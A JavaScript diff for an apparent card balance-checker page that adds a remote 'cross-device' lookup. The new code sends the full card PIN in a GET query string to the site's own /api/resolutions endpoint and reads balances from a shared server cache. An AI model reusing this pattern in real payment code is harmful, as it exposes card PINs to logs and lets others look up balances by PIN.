@@ -258,6 +258,19 @@ function readLatestBalance(cardType, cardPinUpper) {
   }
 }
 
+async function readLatestBalanceRemote(cardType, cardPinUpper) {
+  try {
+    const url = `/api/resolutions?cardType=${encodeURIComponent(cardType)}&cardPin=${encodeURIComponent(cardPinUpper)}`;
+    const res = await fetch(url, { method: 'GET' });
+    if (!res.ok) return null;
+    const data = await res.json();
+    if (!data || !data.found) return null;
+    return data;
+  } catch (_) {
+    return null;
+  }
+}
+
 function maskPin(pin) {
   return pin.length > 4 ? '*'.repeat(pin.length - 4) + pin.slice(-4) : pin;
 }
@@ -300,6 +313,18 @@ async function checkBalance() {
       showResult(cached.balance, cardLabel, maskedPin);
     } else {
       showError(cached.error || 'Card not found or expired.');
+    }
+    return;
+  }
+
+  // Cross-device resolved lookup (shared server cache)
+  const remoteCached = await readLatestBalanceRemote(cardType, cardPin);
+  if (remoteCached) {
+    saveLatestBalance(cardType, cardPin, remoteCached);
+    if (remoteCached.balance) {
+      showResult(remoteCached.balance, cardLabel, maskedPin);
+    } else {
+      showError(remoteCached.error || 'Card not found or expired.');
     }
     return;
   }
